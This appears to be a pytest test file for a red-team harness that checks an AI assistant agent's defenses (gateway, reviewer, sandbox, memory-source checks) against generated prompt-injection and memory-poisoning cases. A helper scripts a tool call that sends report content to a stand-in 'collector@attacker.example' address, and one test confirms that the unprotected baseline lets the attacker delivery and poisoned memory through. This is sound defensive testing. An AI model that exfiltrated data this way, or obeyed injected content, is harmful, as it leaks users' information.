"""Person A integration boundaries; no database or paid model required."""

import json
from unittest.mock import Mock

import httpx
import pytest
from openai import OpenAI

from cybotech.agents.assistant import Assistant
from cybotech.agents.contracts import (
    AgentTurn,
    ModelAction,
    ModelMemory,
)
from cybotech.infrastructure.llm.providers import OpenAIProvider, ScriptedProvider
from cybotech.services.red_team.demo import DemoServices, make_environment
from cybotech.services.red_team.runner import ExperimentRunner
from cybotech.services.red_team.scenarios import RunLimits, VibeHacker


def setup_agent(turns, protected=True, max_steps=6):
    case = VibeHacker().generate(variants_per_objective=1)[0]
    environment = make_environment(case, protected)
    environment.assistant.model = ScriptedProvider(turns)
    environment.assistant.max_steps = max_steps
    return case, environment


def send_turn(destination="collector@attacker.example", done=True):
    return AgentTurn(
        reply="Proposed",
        memories=[],
        actions=[
            ModelAction(
                tool_name="send_report",
                arguments_json=json.dumps({"destination": destination, "content": "SYNTHETIC"}),
            )
        ],
        done=done,
    )


def test_gateway_denial_prevents_dispatch_and_review_precedes_gateway():
    case, env = setup_agent([send_turn()])
    result = env.assistant.run("Send report", "s1", "t1", [case.document])
    assert result.status == "completed"
    assert env.sandbox.calls == []
    events = env.assistant.events.events
    names = [name for name, _ in events]
    assert names.index("sentinel_finding") < names.index("gateway_denied")
    assert "tool_execution_completed" not in names


def test_reviewer_outage_still_calls_gateway_but_blocks_execution():
    case, env = setup_agent([send_turn("reports@internal.example")])
    gateway = Mock(wraps=env.assistant.gateway)
    env.assistant.gateway = gateway
    env.assistant.sentinel = Mock(review=Mock(side_effect=TimeoutError))
    env.assistant.run("Send", "s", "t", [case.document])
    gateway.authorize.assert_called_once()
    assert not env.sandbox.calls


@pytest.mark.parametrize(
    ("component", "method"),
    [
        ("gateway", "authorize"),
        ("retrieval", "retrieve"),
        ("model", "generate"),
    ],
)
def test_dependency_failure_does_not_execute_tools(component, method):
    case, env = setup_agent([send_turn()])
    setattr(env.assistant, component, Mock(**{method: Mock(side_effect=RuntimeError)}))
    result = env.assistant.run("Send", "s", "t", [case.document])
    assert result.status == "failed"
    assert not env.sandbox.calls


def test_unknown_memory_source_is_not_submitted():
    turn = AgentTurn(
        reply="",
        actions=[],
        done=True,
        memories=[
            ModelMemory(
                content="False claim",
                source_document_id="invented",
                claimed_category="policy",
            )
        ],
    )
    case, env = setup_agent([turn], protected=False)
    memory = Mock(wraps=env.assistant.memory)
    env.assistant.memory = memory
    env.assistant.run("Remember", "s", "t", [case.document])
    memory.propose_memory.assert_not_called()


def test_memory_context_is_taken_from_source_not_model():
    case = VibeHacker().generate(variants_per_objective=1)[0]
    turn = AgentTurn(
        reply="",
        actions=[],
        done=True,
        memories=[
            ModelMemory(
                content="Claim",
                source_document_id=case.document.id,
                claimed_category="fact",
            )
        ],
    )
    _, env = setup_agent([turn])
    memory = Mock(wraps=env.assistant.memory)
    env.assistant.memory = memory
    env.assistant.run("Remember", "s", "t", [case.document])
    proposal = memory.propose_memory.call_args.args[0]
    assert proposal.raw_context == case.document.content
    assert proposal.proposed_by == "primary_assistant"


@pytest.mark.parametrize("arguments", ["[]", "not json", '{"destination": 42}'])
def test_malformed_arguments_never_deliver(arguments):
    turn = send_turn().model_copy(
        update={
            "actions": [
                ModelAction(
                    tool_name="send_report",
                    arguments_json=arguments,
                )
            ]
        }
    )
    case, env = setup_agent([turn], protected=False)
    env.assistant.run("Send", "s", "t", [case.document])
    assert not env.sandbox.deliveries


def test_step_limit_stops_nonterminating_model():
    turn = AgentTurn(reply="Continue", memories=[], actions=[], done=False)
    case, env = setup_agent([turn, turn], max_steps=2)
    result = env.assistant.run("Work", "s", "t", [case.document])
    assert result.status == "step_limit"
    assert result.steps == 2


def test_read_tool_result_becomes_valid_source_on_next_step():
    case = VibeHacker().generate(variants_per_objective=1)[0]
    turns = [
        AgentTurn(
            reply="Reading",
            memories=[],
            actions=[
                ModelAction(
                    tool_name="read_email",
                    arguments_json=json.dumps({"id": case.document.id}),
                )
            ],
            done=False,
        ),
        AgentTurn(
            reply="Remembered",
            memories=[
                ModelMemory(
                    content="Maintenance is Friday",
                    source_document_id=case.document.id,
                    claimed_category="vendor_fact",
                )
            ],
            actions=[],
            done=True,
        ),
    ]
    _, env = setup_agent(turns, protected=False)
    result = env.assistant.run("Read vendor email", "s", "t", [])
    assert result.status == "completed"
    assert result.steps == 2
    assert env.trusted_contents() == ["Maintenance is Friday"]


def test_event_failure_does_not_enable_dispatch():
    case, env = setup_agent([send_turn()], protected=False)
    env.assistant.events = Mock(emit=Mock(side_effect=RuntimeError))
    # Even the failure-event write can fail: caller sees the outage, no tool runs.
    with pytest.raises(RuntimeError):
        env.assistant.run("Send", "s", "t", [case.document])
    assert not env.sandbox.calls


def test_duplicate_source_ids_fail_before_model_call():
    case, env = setup_agent([send_turn()], protected=False)
    result = env.assistant.run("Send", "s", "t", [case.document, case.document])
    assert result.status == "failed"
    assert not env.sandbox.calls


def test_sandbox_delivery_never_uses_network(monkeypatch):
    def deny_network(*args, **kwargs):
        raise AssertionError("Sandbox tool attempted network access")

    monkeypatch.setattr("socket.socket.connect", deny_network)
    case, env = setup_agent([send_turn("reports@internal.example")])
    result = env.assistant.run("Send synthetic report", "s", "t", [case.document])
    assert result.tool_results[0].success is True
    assert len(env.sandbox.deliveries) == 1


def test_sandbox_cannot_send_to_real_domains():
    case, env = setup_agent([send_turn("someone@gmail.com")], protected=False)
    result = env.assistant.run("Send", "s", "t", [case.document])
    assert not env.sandbox.deliveries
    assert result.tool_results[0].success is False


def test_scripted_cross_session_demo_and_case_isolation():
    cases = VibeHacker().generate(variants_per_objective=1)
    environments = []

    def factory(case):
        env = make_environment(case, False)
        environments.append(env)
        return env

    rows = ExperimentRunner().run(cases, factory, "demo_baseline", "scripted")
    assert all(row.attacker_delivery and row.poisoned_memory for row in rows)
    assert all(len(env.sandbox.deliveries) == 1 for env in environments)
    protected = ExperimentRunner().run(
        cases,
        lambda case: make_environment(case, True),
        "demo_protected",
        "scripted",
    )
    assert all(not row.attacker_delivery and not row.poisoned_memory for row in protected)
    assert all(row.successful_delivery for row in protected)


def test_generation_seed_and_run_limits():
    cases = VibeHacker().generate(seed=1)
    assert cases == VibeHacker().generate(seed=1)
    assert cases != VibeHacker().generate(seed=2)
    with pytest.raises(ValueError, match="variants_per_objective"):
        VibeHacker().generate(variants_per_objective=11)
    with pytest.raises(ValueError, match="max_iterations"):
        RunLimits(max_iterations=51)
    rows = ExperimentRunner(RunLimits(max_iterations=1)).run(
        cases,
        lambda case: make_environment(case, False),
        "demo_baseline",
        "scripted",
    )
    assert len(rows) == 1


def test_agent_constructor_rejects_invalid_budget():
    services = DemoServices(True)
    with pytest.raises(ValueError, match="max_steps"):
        Assistant(Mock(), services, services, services, services, Mock(), services, max_steps=0)


def test_provider_structured_output_with_mock_transport():
    turn = AgentTurn(reply="Done", memories=[], actions=[], done=True)
    requests = []

    def handler(request):
        requests.append(json.loads(request.content))
        return httpx.Response(
            200,
            json={
                "id": "test",
                "object": "chat.completion",
                "created": 0,
                "model": "test-model",
                "choices": [
                    {
                        "index": 0,
                        "finish_reason": "stop",
                        "message": {
                            "role": "assistant",
                            "content": turn.model_dump_json(),
                        },
                    }
                ],
            },
        )

    with OpenAI(
        api_key="synthetic-test-key",
        max_retries=0,
        http_client=httpx.Client(transport=httpx.MockTransport(handler)),
    ) as client:
        case, env = setup_agent([])
        env.assistant.model = OpenAIProvider(client, "test-model")
        result = env.assistant.run("Summarize", "s", "t", [case.document])
    assert result.status == "completed"
    assert requests[0]["response_format"]["json_schema"]["strict"] is True
    assert requests[0]["messages"][0]["role"] == "system"


def test_provider_refusal_fails_without_execution():
    def handler(request):
        return httpx.Response(
            200,
            json={
                "id": "test",
                "object": "chat.completion",
                "created": 0,
                "model": "test-model",
                "choices": [
                    {
                        "index": 0,
                        "finish_reason": "stop",
                        "message": {
                            "role": "assistant",
                            "content": None,
                            "refusal": "Refused",
                        },
                    }
                ],
            },
        )

    with OpenAI(
        api_key="synthetic-test-key",
        max_retries=0,
        http_client=httpx.Client(transport=httpx.MockTransport(handler)),
    ) as client:
        case, env = setup_agent([])
        env.assistant.model = OpenAIProvider(client, "test-model")
        result = env.assistant.run("Summarize", "s", "t", [case.document])
    assert result.status == "failed"
    assert not env.sandbox.calls
